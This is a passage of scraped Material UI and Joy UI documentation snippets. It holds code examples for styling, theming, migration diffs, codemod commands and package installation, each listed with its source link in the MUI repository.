Heading\n</Typography>\n```\n\n----------------------------------------\n\nTITLE: Converting JSS to Multiple Styled Components\nDESCRIPTION: Example showing how to convert JSS styles into multiple styled components without increasing CSS specificity\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/migrating-from-jss.md#2025-04-22_snippet_3\n\nLANGUAGE: diff\nCODE:\n```\n-import makeStyles from '@mui/styles/makeStyles';\n+import { styled } from '@mui/material/styles';\n\n-const useStyles = makeStyles((theme) => ({\n-  root: {\n-    display: 'flex',\n-    alignItems: 'center',\n-    borderRadius: 20,\n-    background: theme.palette.grey[50],\n-  },\n-  label: {\n-    color: theme.palette.primary.main,\n-  }\n-}))\n+const Root = styled('div')(({ theme }) => ({\n+  display: 'flex',\n+  alignItems: 'center',\n+  borderRadius: 20,\n+  background: theme.palette.grey[50],\n+}))\n\n+const Label = styled('span')(({ theme }) => ({\n+  color: theme.palette.primary.main,\n+}))\n\n function Status({ label }) {\n-  const classes = useStyles();\n   return (\n-    <div className={classes.root}>\n-      {icon}\n-      <span className={classes.label}>{label}</span>\n-    </div>\n+    <Root>\n+      {icon}\n+      <Label>{label}</Label>\n+    </Root>\n   )\n }\n```\n\n----------------------------------------\n\nTITLE: Using CSS Variables with styled-components in Material-UI\nDESCRIPTION: Demonstrates how to use theme.vars.* to reference CSS variables directly in styled components. This is the recommended approach for working with themes that use CSS variables.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v7/upgrade-to-v7.md#2025-04-22_snippet_11\n\nLANGUAGE: javascript\nCODE:\n```\nconst Custom = styled('div')(({ theme }) => ({\n  color: theme.vars.palette.text.primary,\n  background: theme.vars.palette.primary.main,\n}));\n```\n\n----------------------------------------\n\nTITLE: Customizing CssBaseline with GlobalStyles in Joy UI\nDESCRIPTION: This example demonstrates how to customize the styles produced by CssBaseline by appending GlobalStyles component and defining custom CSS object styles for HTML elements.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/css-baseline/css-baseline.md#2025-04-22_snippet_3\n\nLANGUAGE: js\nCODE:\n```\nimport { CssVarsProvider } from '@mui/joy/styles';\nimport CssBaseline from '@mui/joy/CssBaseline';\nimport GlobalStyles from '@mui/joy/GlobalStyles';\n\nfunction App() {\n  return (\n    <CssVarsProvider>\n      <CssBaseline /> {/* CssBaseline must come first */}\n      <GlobalStyles\n        styles={{\n          // CSS object styles\n          html: {\n            // ...\n          },\n          body: {\n            // ...\n          },\n        }}\n      />\n    </CssVarsProvider>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: RTL Style Override\nDESCRIPTION: Example of opting out of RTL transformation for specific styles using the @noflip directive.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/right-to-left/right-to-left.md#2025-04-22_snippet_6\n\nLANGUAGE: javascript\nCODE:\n```\nconst LeftToRightTextInRtlApp = styled('div')`\n  /* @noflip */\n  text-align: left;\n`;\n```\n\n----------------------------------------\n\nTITLE: Updating InputLabel Size Prop\nDESCRIPTION: Diff showing how to update the InputLabel size prop from 'normal' to 'medium' to follow the standard naming convention in v7.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v7/upgrade-to-v7.md#2025-04-22_snippet_9\n\nLANGUAGE: diff\nCODE:\n```\n-<InputLabel size=\"normal\">Label</InputLabel>\n+<InputLabel size=\"medium\">Label</InputLabel>\n```\n\n----------------------------------------\n\nTITLE: Defining Options Structure for Autocomplete\nDESCRIPTION: Shows the different ways to structure options for the Autocomplete component. Options can be defined as strings or objects with a label property.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/autocomplete/autocomplete.md#2025-04-22_snippet_1\n\nLANGUAGE: js\nCODE:\n```\nconst options = [\n  { label: 'The Godfather', id: 1 },\n  { label: 'Pulp Fiction', id: 2 },\n];\n// or\nconst options = ['The Godfather', 'Pulp Fiction'];\n```\n\n----------------------------------------\n\nTITLE: Extending MUI Theme Palette and Button Colors (TSX)\nDESCRIPTION: Shows how to add a custom color (`neutral`) to the MUI theme's palette and enable its use with the `Button` component's `color` prop. This involves extending the theme, declaring the new palette color and Button color override for TypeScript type safety, and then using the new color directly on the Button.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/mui-core-v5.md#2025-04-22_snippet_3\n\nLANGUAGE: tsx\nCODE:\n```\nimport { createTheme, Button } from '@mui/material';\n\n// 1. Extend the theme.\nconst theme = createTheme({\n  palette: {\n    neutral: {\n      main: '#d79b4a',\n    },\n  },\n});\n\n// 2. Notify TypeScript about the new color in the palette\ndeclare module '@mui/material/styles' {\n  interface Palette {\n    neutral: Palette['primary'];\n  }\n  interface PaletteOptions {\n    neutral: PaletteOptions['primary'];\n  }\n}\n\n// 3. Update the Button's color prop options\ndeclare module '@mui/material/Button' {\n  interface ButtonPropsColorOverrides {\n    neutral: true;\n  }\n}\n\n// 4. Profit\n<Button color=\"neutral\"  />\n```\n\n----------------------------------------\n\nTITLE: Augmenting MUI Joy UI Theme Scales for Letter Spacing in TypeScript\nDESCRIPTION: Defines the structure for the old `letterSpacing` scale within the MUI Joy UI theme types using TypeScript module augmentation. This allows TypeScript projects to recognize and use the `sm`, `md`, and `lg` keys if added back to the theme.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/migration/migrating-default-theme.md#2025-04-22_snippet_11\n\nLANGUAGE: typescript\nCODE:\n```\n// You can put this to any file that's included in your tsconfig\ndeclare module '@mui/joy/styles' {\n  interface ThemeScales {\n    letterSpacing: {\n      sm: string;\n      md: string;\n      lg: string;\n    };\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Customizing Dark Mode Palette in Material UI\nDESCRIPTION: Demonstrates how to override the default dark palette with custom colors using createTheme.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/dark-mode/dark-mode.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\nconst darkTheme = createTheme({\n  palette: {\n    mode: 'dark',\n    primary: {\n      main: '#ff5252',\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Implementing Custom Child Element for Tooltip in React\nDESCRIPTION: This snippet demonstrates how to create a custom React component that can be used as a child of a Tooltip. It shows how to properly spread props and forward refs to ensure the Tooltip works correctly with the custom component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/tooltips/tooltips.md#2025-04-22_snippet_0\n\nLANGUAGE: JSX\nCODE:\n```\nconst MyComponent = React.forwardRef(function MyComponent(props, ref) {\n  //  Spread the props to the underlying DOM element.\n  return (\n    <div {...props} ref={ref}>\n      Bin\n    </div>\n  );\n});\n\n// ...\n\n<Tooltip title=\"Delete\">\n  <MyComponent />\n</Tooltip>;\n```\n\n----------------------------------------\n\nTITLE: Installing Emotion Dependencies with npm\nDESCRIPTION: Command to install Emotion packages which are peer dependencies of Material UI v5. Emotion replaces JSS as the default styling solution.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/migration-v4.md#2025-04-22_snippet_9\n\nLANGUAGE: bash\nCODE:\n```\nnpm install @emotion/react @emotion/styled\n```\n\n----------------------------------------\n\nTITLE: Using the Typography Component with theme levels in Joy UI\nDESCRIPTION: Example of using the Typography component with the 'level' prop to apply predefined typography styles from the theme.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/theme-typography/theme-typography.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\n// use the `theme.typography['body-sm']` styles\n<Typography level=\"body-sm\">Secondary info</Typography>\n```\n\n----------------------------------------\n\nTITLE: Configuring Font Family in Material-UI with JSX\nDESCRIPTION: Demonstrates how to set font family using the Box component in Material-UI. It shows using the default theme font and a specific font family.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/typography/typography.md#2025-04-22_snippet_6\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ fontFamily: 'default' }}>…\n<Box sx={{ fontFamily: 'Monospace' }}>…\n```\n\n----------------------------------------\n\nTITLE: Integrating Material UI with Theme UI\nDESCRIPTION: Demonstrates how to use Material UI alongside Theme UI by nesting the Material UI ThemeProvider inside Theme UI's provider and assigning the Material UI theme to the THEME_ID property.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/theme-scoping/theme-scoping.md#2025-04-22_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nimport { ThemeUIProvider } from 'theme-ui';\nimport { createTheme as materialCreateTheme, THEME_ID } from '@mui/material/styles';\n\nconst themeUITheme = {\n  fonts: {\n    body: 'system-ui, sans-serif',\n    heading: '\"Avenir Next\", sans-serif',\n    monospace: 'Menlo, monospace',\n  },\n  colors: {\n    text: '#000',\n    background: '#fff',\n    primary: '#33e',\n  },\n};\n\nconst materialTheme = materialCreateTheme();\n\nfunction App() {\n  return (\n    <ThemeUIProvider theme={themeUITheme}>\n      <MaterialThemeProvider theme={{ [THEME_ID]: materialTheme }}>\n        Theme UI components and Material UI components\n      </MaterialThemeProvider>\n    </ThemeUIProvider>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Warning About Palette and ColorSchemes API Conflicts in Material UI\nDESCRIPTION: Demonstrates how the palette API overrides colorSchemes when both are used. This example shows the potential conflict between these two theming approaches.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/palette/palette.md#2025-04-22_snippet_9\n\nLANGUAGE: javascript\nCODE:\n```\nconst theme = createTheme({\n  palette: {\n    primary: {\n      main: '...',\n    },\n  },\n  colorSchemes: {\n    light: {\n      // This will be replaced by the palette defined above\n      palette: {\n        primary: {\n          main: '...',\n        },\n      },\n    },\n    dark: { ... },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Portal Implementation with DOM Node Props\nDESCRIPTION: Example demonstrating proper implementation of Portal component with DOM node handling in React.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/getting-started/faq/faq.md#2025-04-22_snippet_4\n\nLANGUAGE: jsx\nCODE:\n```\nfunction App() {\n  const [container, setContainer] = React.useState(null);\n  const handleRef = React.useCallback(\n    (instance) => setContainer(instance),\n    [setContainer],\n  );\n\n  return (\n    <div className=\"App\">\n      <Portal container={container}>\n        <span>Portaled</span>\n      </Portal>\n      <div ref={handleRef} />\n    </div>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Testing Console Error Handling in React Components\nDESCRIPTION: Examples demonstrating how to test console.error messages in React components using custom matchers toErrorDev. Shows both error case and non-error case scenarios.\nSOURCE: https://github.com/mui/material-ui/blob/master/test/README.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\nfunction SomeComponent({ variant }) {\n  if (process.env.NODE_ENV !== 'production') {\n    if (variant === 'unexpected') {\n      console.error(\"That variant doesn't make sense.\");\n    }\n    if (variant !== undefined) {\n      console.error('`variant` is deprecated.');\n    }\n  }\n\n  return <div />;\n}\nexpect(() => {\n  render(<SomeComponent variant=\"unexpected\" />);\n}).toErrorDev([\"That variant doesn't make sense.\", '`variant` is deprecated.']);\n```\n\nLANGUAGE: javascript\nCODE:\n```\nfunction SomeComponent({ variant }) {\n  if (process.env.NODE_ENV !== 'production') {\n    if (variant === 'unexpected') {\n      console.error(\"That variant doesn't make sense.\");\n    }\n    if (variant !== undefined) {\n      console.error('`variant` is deprecated.');\n    }\n  }\n\n  return <div />;\n}\nexpect(() => {\n  render(<SomeComponent />);\n}).not.toErrorDev();\n```\n\n----------------------------------------\n\nTITLE: Importing DefaultTheme Component in React\nDESCRIPTION: A demo component reference used to display the theme structure viewer. The component is configured to hide the toolbar and display with an inline background.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/default-theme/default-theme.md#2025-04-22_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\n{\"demo\": \"DefaultTheme.js\", \"hideToolbar\": true, \"bg\": \"inline\"}\n```\n\n----------------------------------------\n\nTITLE: Assembling the Stat Component in Material UI\nDESCRIPTION: This code snippet shows how to assemble the Stat component using the previously created slots. It includes the component structure and basic props handling.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/creating-themed-components/creating-themed-components.md#2025-04-22_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\n// /path/to/Stat.js\nimport * as React from 'react';\n\nconst StatRoot = styled('div', {\n  name: 'MuiStat',\n  slot: 'root',\n})(…);\n\nconst StatValue = styled('div', {\n  name: 'MuiStat',\n  slot: 'value',\n})(…);\n\nconst StatUnit = styled('div', {\n  name: 'MuiStat',\n  slot: 'unit',\n})(…);\n\nconst Stat = React.forwardRef(function Stat(props, ref) {\n  const { value, unit, ...other } = props;\n\n  return (\n    <StatRoot ref={ref} {...other}>\n      <StatValue>{value}</StatValue>\n      <StatUnit>{unit}</StatUnit>\n    </StatRoot>\n  );\n});\n\nexport default Stat;\n```\n\n----------------------------------------\n\nTITLE: Creating custom styled components with theme typography in Joy UI\nDESCRIPTION: Example of using the styled function to create a custom component that applies theme typography styles along with additional styling.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/theme-typography/theme-typography.md#2025-04-22_snippet_3\n\nLANGUAGE: jsx\nCODE:\n```\nimport { styled } from '@mui/joy/styles';\n\nconst Tag = styled('span')((theme) => ({\n  ...theme.typography['body-sm'],\n  color: 'inherit',\n  borderRadius: theme.vars.radius.xs,\n  boxShadow: theme.vars.shadow.sm,\n  padding: '0.125em 0.375em',\n}));\n```\n\n----------------------------------------\n\nTITLE: Disabling MUI System Styling Features with styled - Diff\nDESCRIPTION: This diff shows how to disable specific MUI System styling features by editing the options object passed to the styled function. It demonstrates removing the theme.components[name].styleOverrides resolver and disabling both variants and the sx prop. Dependencies include MUI System and either Emotion or styled-components. Modifying these options controls how much MUI-specific integration is enabled in the styling process.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/styled/styled.md#2025-04-22_snippet_1\n\nLANGUAGE: diff\nCODE:\n```\n const StyledComponent = styled('div', {}, {\n   name: 'MuiStyled',\n   slot: 'Root',\n-  overridesResolver: (props, styles) => styles.root, // disables theme.components[name].styleOverrides\n+  skipVariantsResolver: true, // disables theme.components[name].variants\n+  skipSx: true, // disables the sx prop\n });\n```\n\n----------------------------------------\n\nTITLE: Initializing Basic Joy UI Sheet Component\nDESCRIPTION: Sets up the basic Sheet component with CssVarsProvider for Joy UI styling support.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/getting-started/tutorial/tutorial.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport * as React from 'react';\nimport { CssVarsProvider } from '@mui/joy/styles';\nimport Sheet from '@mui/joy/Sheet';\n\nexport default function App() {\n  return (\n    <CssVarsProvider>\n      <Sheet variant=\"outlined\">Welcome!</Sheet>\n    </CssVarsProvider>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Customizing Input Components with Automatic Adjustments in Joy UI\nDESCRIPTION: Shows how to create and customize Input components in Joy UI, including the use of decorators and automatic adjustment of child components. It also demonstrates how to override styles using the sx prop.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/first-look-at-joy.md#2025-04-22_snippet_1\n\nLANGUAGE: JSX\nCODE:\n```\n<Input\n  placeholder=\"password\"\n  endDecorator={<IconButton size=\"sm\"><Visibility /></IconButton>}\n/>\n\n<Input\n  size=\"lg\"\n  placeholder=\"password\"\n  endDecorator={<IconButton><Visibility /></IconButton>}\n  sx={{ '--Input-radius': '24px' }}\n/>\n```\n\n----------------------------------------\n\nTITLE: Enabling Accessible DOM Structure for MUI Field Components (JSX)\nDESCRIPTION: This code activates enhanced accessibility in MUI DateField and DatePicker components via the enableAccessibleFieldDOMStructure prop. It restructures underlying DOM and manages ARIA attributes for better screen reader support, especially for complex or multi-input scenarios. The feature requires MUI X v7+ and the optional prop, and expects no other parameters but the prop itself; outputs are accessible date field/picker components.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/mui-x-v7.md#2025-04-22_snippet_4\n\nLANGUAGE: JSX\nCODE:\n```\n<DateField enableAccessibleFieldDOMStructure />\n<DatePicker enableAccessibleFieldDOMStructure />\n```\n\n----------------------------------------\n\nTITLE: Rename theme.palette.type to theme.palette.mode\nDESCRIPTION: Code diff showing the renaming of theme.palette.type to theme.palette.mode to better follow the conventional \"dark mode\" terminology.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-style-changes.md#2025-04-22_snippet_13\n\nLANGUAGE: diff\nCODE:\n```\n import { createTheme } from '@mui/material/styles';\n-const theme = createTheme({ palette: { type: 'dark' } }),\n+const theme = createTheme({ palette: { mode: 'dark' } }),\n```\n\n----------------------------------------\n\nTITLE: Updating Tabs default prop values in React\nDESCRIPTION: Changes the default indicatorColor and textColor prop values to 'primary' for Tabs component, and shows how to keep v4 color styles.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_33\n\nLANGUAGE: diff\nCODE:\n```\n-<Tabs />\n+<Tabs indicatorColor=\"secondary\" textColor=\"inherit\" />\n```\n\n----------------------------------------\n\nTITLE: Preventing Clickaway Closure for Snackbar\nDESCRIPTION: Code pattern to prevent a Snackbar from closing when a user clicks outside of it by checking the close reason and returning early if it's 'clickaway'.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/snackbar/snackbar.md#2025-04-22_snippet_2\n\nLANGUAGE: js\nCODE:\n```\n<Snackbar\n  onClose={(event, reason) => {\n    if (reason === 'clickaway') {\n      return;\n    }\n  }}\n>\n```\n\n----------------------------------------\n\nTITLE: Testing Media Queries with Jest\nDESCRIPTION: Shows how to set up media query testing using css-mediaquery for mocking matchMedia in Jest environment.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/use-media-query/use-media-query.md#2025-04-22_snippet_1\n\nLANGUAGE: js\nCODE:\n```\nimport mediaQuery from 'css-mediaquery';\n\nfunction createMatchMedia(width) {\n  return (query) => ({\n    matches: mediaQuery.match(query, {\n      width,\n    }),\n    addEventListener: () => {},\n    removeEventListener: () => {},\n  });\n}\n\ndescribe('MyTests', () => {\n  beforeAll(() => {\n    window.matchMedia = createMatchMedia(window.innerWidth);\n  });\n});\n```\n\n----------------------------------------\n\nTITLE: Disabling Ripple Effect in Material UI Theme\nDESCRIPTION: Configuration to globally disable the ripple effect across all Material UI components by modifying the theme settings.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/getting-started/faq/faq.md#2025-04-22_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nimport { createTheme } from '@mui/material';\n\nconst theme = createTheme({\n  components: {\n    // Name of the component ⚛️\n    MuiButtonBase: {\n      defaultProps: {\n        // The props to apply\n        disableRipple: true, // No more ripple, on the whole application 💣!\n      },\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Setting fontWeight Using Theme Typography Key with sx Prop in Material UI JSX\nDESCRIPTION: Demonstrates setting `fontWeight` using a specific key (e.g., 'fontWeightLight') that maps directly to a value defined in the `theme.typography` object within the `sx` prop.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/getting-started/the-sx-prop/the-sx-prop.md#2025-04-22_snippet_12\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ fontWeight: 'fontWeightLight' }} />\n// equivalent to fontWeight: theme.typography.fontWeightLight\n```\n\n----------------------------------------\n\nTITLE: Running the menu-item-primary-text codemod\nDESCRIPTION: Command to execute the codemod that updates MenuItem components from using primaryText prop to using children.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_129\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v1.0.0/menu-item-primary-text <path>\n```\n\n----------------------------------------\n\nTITLE: TypeScript Module Augmentation for Custom Breakpoints in Material-UI\nDESCRIPTION: Demonstrates how to use TypeScript module augmentation to add custom breakpoint values to the theme type definition in Material-UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/getting-started/usage/usage.md#2025-04-22_snippet_4\n\nLANGUAGE: ts\nCODE:\n```\ndeclare module '@mui/material/styles' {\n  interface BreakpointOverrides {\n    xs: false; // removes the `xs` breakpoint\n    sm: false;\n    md: false;\n    lg: false;\n    xl: false;\n    tablet: true; // adds the `tablet` breakpoint\n    laptop: true;\n    desktop: true;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: FormControlLabel Props Codemod Command\nDESCRIPTION: Bash command to automatically transform deprecated FormControlLabel component props using MUI's codemod utility.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_35\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest deprecations/form-control-label-props <path>\n```\n\n----------------------------------------\n\nTITLE: Custom Separator Button Group\nDESCRIPTION: Implementation showing how to create custom separators between buttons using the Divider component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/button-group/button-group.md#2025-04-22_snippet_3\n\nLANGUAGE: jsx\nCODE:\n```\n{\"demo\": \"CustomSeparatorButtonGroup.js\"}\n```\n\n----------------------------------------\n\nTITLE: Defining a Styled Button Without sx Shortcuts - JavaScript\nDESCRIPTION: This code demonstrates that when using the styled function, 'mx: 1' is not a valid shortcut—those are exclusive to the sx prop. The MyStyledButton component is styled using direct style properties and will interpret 'mx: 1' as a custom property rather than spacing. This technique requires the @mui/system or @mui/material styling pipeline.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/styled/styled.md#2025-04-22_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nconst MyStyledButton = styled('button')({\n  mx: 1, // \\u274C don't use this! This shortcut is only provided by the `sx` prop\n});\n```\n\n----------------------------------------\n\nTITLE: Adding Units to System `gap` Props in JSX\nDESCRIPTION: Illustrates the change required for system `gap` properties (`gap`, `rowGap`, `columnGap`) in MUI v5. Numerical values previously interpreted as spacing units now require explicit units (e.g., 'px') to bypass the theme spacing transformation.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-style-changes.md#2025-04-22_snippet_37\n\nLANGUAGE: diff\nCODE:\n```\n  <Box\n-  gap={2}\n+  gap=\"2px\"\n  >\n```\n\n----------------------------------------\n\nTITLE: Customizing Textarea Focus Ring with CSS Variables\nDESCRIPTION: Shows how to customize the Textarea's focus ring appearance by setting CSS variables through the sx prop. This allows controlling the position, size, and color of the focus ring.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/textarea/textarea.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\n<Textarea sx={{ '&:focus-within::before': { boxShadow: '...your custom value' } }} />\n```\n\n----------------------------------------\n\nTITLE: Using Theme with styled-components in Material-UI\nDESCRIPTION: Shows how to use the Material-UI theme within styled-components. The example demonstrates accessing theme properties like palette colors and using them in the style definition.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/interoperability/interoperability.md#2025-04-22_snippet_9\n\nLANGUAGE: jsx\nCODE:\n```\nconst CustomizedSlider = styled(Slider)(\n  ({ theme }) => `\n  color: ${theme.palette.primary.main};\n\n  :hover {\n    color: ${darken(theme.palette.primary.main, 0.2)};\n  }\n`,\n);\n```\n\n----------------------------------------\n\nTITLE: Installing Next.js Plugin for Pigment CSS\nDESCRIPTION: Commands for installing the Next.js plugin for Pigment CSS as a development dependency using different package managers.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/migrating-to-pigment-css.md#2025-04-22_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nnpm install --save-dev @pigment-css/nextjs-plugin\n```\n\nLANGUAGE: bash\nCODE:\n```\npnpm add -D @pigment-css/nextjs-plugin\n```\n\nLANGUAGE: bash\nCODE:\n```\nyarn add -D @pigment-css/nextjs-plugin\n```\n\n----------------------------------------\n\nTITLE: Menu with Fade Transition\nDESCRIPTION: Menu implementation with custom fade transition effect.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/menus/menus.md#2025-04-22_snippet_10\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"FadeMenu.js\"}\n```\n\n----------------------------------------\n\nTITLE: Applying Custom Shadows to Specific Elements\nDESCRIPTION: Shows the correct way to customize shadow properties on individual elements. This example demonstrates how to properly apply custom shadow colors and ring effects to a Button component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/theme-shadow/theme-shadow.md#2025-04-22_snippet_5\n\nLANGUAGE: js\nCODE:\n```\n// ✅\n<Button\n  sx={(theme) => ({\n    boxShadow: theme.shadow.md,\n    '--joy-shadowChannel': theme.vars.palette.primary.mainChannel,\n    '--joy-shadowRing': 'inset 0 -3px 0 rgba(0 0 0 / 0.24)',\n  })}\n>\n\n// ❌ Both of these do not work\n<Button\n  sx={(theme) => ({\n    boxShadow: 'md',\n    '--joy-shadowChannel': theme.vars.palette.primary.mainChannel,\n    '--joy-shadowRing': 'inset 0 -3px 0 rgba(0 0 0 / 0.24)',\n  })}\n>\n<Button\n  sx={(theme) => ({\n    boxShadow: theme.vars.shadow.md,\n    '--joy-shadowChannel': theme.vars.palette.primary.mainChannel,\n    '--joy-shadowRing': 'inset 0 -3px 0 rgba(0 0 0 / 0.24)',\n  })}\n>\n```\n\n----------------------------------------\n\nTITLE: Setting Flex Shrink with Material-UI Box Component in JSX\nDESCRIPTION: Demonstrates how to control whether flex items should shrink when space is limited using the flexShrink property. flexShrink: 0 prevents shrinking, while flexShrink: 1 allows shrinking.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/flexbox/flexbox.md#2025-04-22_snippet_8\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ width: '100%' }}>Item 1</Box>\n<Box sx={{ flexShrink: 1 }}>Item 2</Box>\n<Box sx={{ flexShrink: 0 }}>Item 3</Box>\n```\n\n----------------------------------------\n\nTITLE: Applying preset-safe transformations for v4 to v5 migration\nDESCRIPTION: This codemod applies a combination of all important transformers for migrating from Material-UI v4 to v5. It includes various component-specific and general transformations to update the codebase.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_71\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v5.0.0/preset-safe <path|folder>\n```\n\n----------------------------------------\n\nTITLE: TypeScript Module Augmentation for Modal Dialog\nDESCRIPTION: TypeScript code showing how to augment the ModalDialog component to support a custom 'top' layout option.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/modal/modal.md#2025-04-22_snippet_2\n\nLANGUAGE: ts\nCODE:\n```\n// at the root or theme file\ndeclare module '@mui/joy/ModalDialog' {\n  interface ModalDialogPropsLayoutOverrides {\n    top: true;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Fixed Columns Configuration in Masonry\nDESCRIPTION: Demonstrates setting a fixed number of columns in the Masonry layout.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/masonry/masonry.md#2025-04-22_snippet_3\n\nLANGUAGE: jsx\nCODE:\n```\nFixedColumns.js\n```\n\n----------------------------------------\n\nTITLE: Using theme.breakpoints.up Example\nDESCRIPTION: Example of using theme.breakpoints.up to apply styles for screens wider than the md breakpoint.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/breakpoints/breakpoints.md#2025-04-22_snippet_4\n\nLANGUAGE: js\nCODE:\n```\nconst styles = (theme) => ({\n  root: {\n    backgroundColor: 'blue',\n    // Match [md, ∞)\n    //       [900px, ∞)\n    [theme.breakpoints.up('md')]: {\n      backgroundColor: 'red',\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Manual Selection Tabs Implementation\nDESCRIPTION: Basic implementation of Tabs requiring manual selection for each tab.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/tabs/tabs.md#2025-04-22_snippet_3\n\nLANGUAGE: jsx\nCODE:\n```\n/* Tabs where each tab needs to be selected manually */\n<Tabs />\n```\n\n----------------------------------------\n\nTITLE: Setting Grid Column Properties\nDESCRIPTION: Demonstrates how to set grid column positioning using either line numbers or span values.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/grid/grid.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ gridColumn: '1 / 3' }}>…\n```\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ gridColumn: 'span 2' }}>…\n```\n\n----------------------------------------\n\nTITLE: Controlling White Space in Material-UI\nDESCRIPTION: Examples of whiteSpace property usage to control text wrapping and line breaks. This demonstrates nowrap to prevent text wrapping and normal to allow standard wrapping behavior.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/display/display.md#2025-04-22_snippet_7\n\nLANGUAGE: jsx\nCODE:\n```\n<Box component=\"div\" sx={{ whiteSpace: 'nowrap' }}>\n  Lorem Ipsum has been the industry's standard dummy text ever since the 1500s.\n</Box>\n<Box component=\"div\" sx={{ whiteSpace: 'normal' }}>\n  Lorem Ipsum has been the industry's standard dummy text ever since the 1500s.\n</Box>\n```\n\n----------------------------------------\n\nTITLE: Selected Menu with Initial Focus\nDESCRIPTION: Menu implementation with selected items and initial focus handling.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/menus/menus.md#2025-04-22_snippet_3\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"SimpleListMenu.js\"}\n```\n\n----------------------------------------\n\nTITLE: Configuring Emotion Cache for Proper Style Injection\nDESCRIPTION: Shows how to configure Emotion's cache when using a custom cache in your app to ensure correct injection order with Material UI's styles.\nSOURCE: 